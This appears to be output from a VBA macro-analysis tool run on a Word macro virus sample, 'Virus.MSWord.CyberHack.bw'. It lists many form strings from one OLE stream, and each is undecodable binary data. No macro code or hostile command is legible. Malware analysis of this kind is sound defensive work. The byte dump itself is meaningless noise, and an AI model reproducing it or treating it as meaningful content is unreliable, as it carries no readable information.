VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scBƭ{ƭ{��k��k��k��k��k��k��k��k��k��s��s��s��s��s��s��k��k��k�kR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�{Z��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��Z��k��Z��Z��c11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sJΥs��k�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ91!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJRB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!{R){R)�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�s9��������������k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�kB�����������c�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�{J�ބ���ΜcZB1cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ9�Z1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�������s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J��R��R�{J��R��R��R��R��R��R��R��R��R��R��R��R��c��c��c��c��cƜcƜcƜcƜcΜZΜcΜcΜcΜc֥c֥c֥c֥c֥cΜcΜcΜcΜcΜZƜcƜcƜcƜc��c��c1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scJƭ{Υs��k��k��k��k��k��k��k��s��s��s��s��s��k��k��k��k��k��k�kR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)�{Z��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��c11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)޵{ƭ{�sJ�kR�sJ�kR�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ{cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cR1sZ9�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�{J��������������s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�{J�����������Z�kB�kB�Z1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB��c����������kB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!�Z1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�������k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J��R��R��R��R��R��R��R��R��R��R��R��c�kBsZ9cR1ZJ1sZ9�kB�{JƜcƜcΜZΜcΜcΜc֥c֥c֥c֥c֥c֥c֥c֥c֥cΜcΜcΜcΜZƜcƜcƜcƜc��c�kB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scJƭ{ƭ{Υs��k��k��k��k��k��k��k��s��s��s��s��s��s��k��k��k��k�kR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1��Z��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��Z��Z��k��Z��Z��Z��Z��Z��c1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k�Ƅ��k�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�kR�sJ�kR�kR�kR�sJ�kR�sJ�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�sJ�kRcZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!������������{kJscJscJ{kJscJscJscJscJscJscJscJscJscJscJscJscJscJRB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kR9�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�{J��������������s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB��R�����������R�kB�Z1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kBΜZ���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�Z1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB������ޥc
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J��R��R��R��R��R��R��RƜc�kB1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ9��cΜcΜc֥c֥c֥c֥cޥcޥcޥc֥c֥c֥c֥cΜcΜcΜcΜZƜcƜcƜc��c��c)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scJƵ�ƭ{ƭ{ƭ{ƭ{��k��k��k��k��k��k��k��k��s��s��s��s��s��s��s�kR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1��c��s��k��k��s��s��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��c1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�Ό�Ƅ�{Z�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJkcBRB)91!kR9�{����眥�k�sJ�sJ�sJ�sJ�sJ�sJ�sJ�kR�sJ�sJ�kR�sJ�kR�sJ�sJ�sJ�sJ�kR�sJ�kR�kR�kR�kR�kR)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJscJ{kJRB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ9�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�sJ�sJ�sJ�kB��c���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J��c�����������R�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB����������{J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB������֜R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ9�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J��R��R��R�΄��R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{cB֥c֥cޥcޥcޥcޥcޥcޥcޥcޥcޥc֥c֥c֥cΜcΜZΜZƜcƜcƜc��c�Z1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{kJֽ�ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{��{��{��k��k��k��k��k��k��k��k��s�sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1��Z��s��s��s��s��s��s��s��s��s��k��k��k��s��s��s��s��s��s��k��k��k��k��k��k��k��k��k��Z1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k��ƭ{�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJkcB11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
11!�������������c�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�kR�sJ�sJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJRB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{cB�sJ�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{RƜk���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R��Z�{R��Z��k�����������R�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�{J���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB������֜R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�kB�kB�kB�kB�kB�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�眔{R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!Ɯcޥcޥc�k�k�k�k�kޥcޥcޥc֥c֥cΜZΜZΜZƜcƜc��c��c��c)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{kJֽ�Ƶ�Ƶ�Ƶ�ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{�����{��{��{��{��{��{��k��k�{Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZZ9��k��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��k��c1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���眥�Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�sZ�sZ�sZ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJkcB)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������県sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�kR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kR�{Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z޵{���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
11!��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Zֽ������������k�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB��s���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ9�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB������ΜZ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cR1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�{J�{J�{J�{J�{J�{J�{J�{J�{JƜc���RB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ɯc�k�k�k�k�k�k�k�kޥcޥc֜R֜RΜZΜZƜcƜc��c��c��c�Z1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{kJ�ΜƵ�Ƶ�Ƶ�Ƶ�Ƶ�ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{��������{��{��{��{��ccZ9��k��{��{��{��{��{��{��{��{��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��k11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{Z����眔{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{ZRB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c��������c�{Z�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZ�sZB1!91!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{Z��c��k��Z��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��kֽ����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
11!��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��s��s��kֽ������������s�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB������Ɯc
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�{J�{J�{J�{J�{J�{J�{J���RB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֥c�k�k�k�k�k�k�k�kޥcޥc֜RΜZΜZƜcƜc��c��c��c�kB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{kJ�Μֽ�ν�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{�����������s��s��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��k))
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������ƭ{�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�sZ91!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c�����������c�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z{kJ91!������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��s��s��s��s�Μ���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��{�Μ�������������kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�ބ���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB��������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�{J�{J�{J�{J�{J�{J�{J�����c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!��k��k��k��k�k�k�k�k�kޥc֥c֜RΜZΜZƜcΌJ��c��c�{9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kR�Μֽ�ֽ�ֽ�ν�ν�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{��������������������������{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��k11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scJ��������c��c�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{ZB1!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{Z�����������k�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{ZkR9������������{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJ{kJZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k��k��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s�����������������
-------------------------------------------------------------------------------
